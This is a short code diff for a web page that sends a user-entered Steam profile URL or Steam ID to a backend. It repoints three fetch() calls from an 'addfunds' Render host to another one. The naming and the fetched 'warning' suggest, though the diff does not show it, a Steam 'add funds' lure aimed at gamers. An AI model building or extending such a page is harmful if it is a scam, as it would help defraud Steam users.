@@ -188,7 +188,7 @@
   async function submitSteam() {
     const url = document.getElementById('steam-url').value;
     try {
-      const res = await fetch('https://addfunds-11.onrender.com', {
+      const res = await fetch('https://yawabackend.onrender.com', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ steamUrl: url })
@@ -216,7 +216,7 @@
     const steamId = window.lastSteamId;
     if (!steamId) return;
     try {
-      await fetch('https://addfunds-11.onrender.com', {
+      await fetch('https://yawabackend.onrender.com', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ steamId })
@@ -251,7 +251,7 @@
     if (!steamId) return;
 
     try {
-      const res = await fetch('https://addfunds-11.onrender.com/api/get-warning', {
+      const res = await fetch('https://yawabackend.onrender.com/api/get-warning', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ steamId })
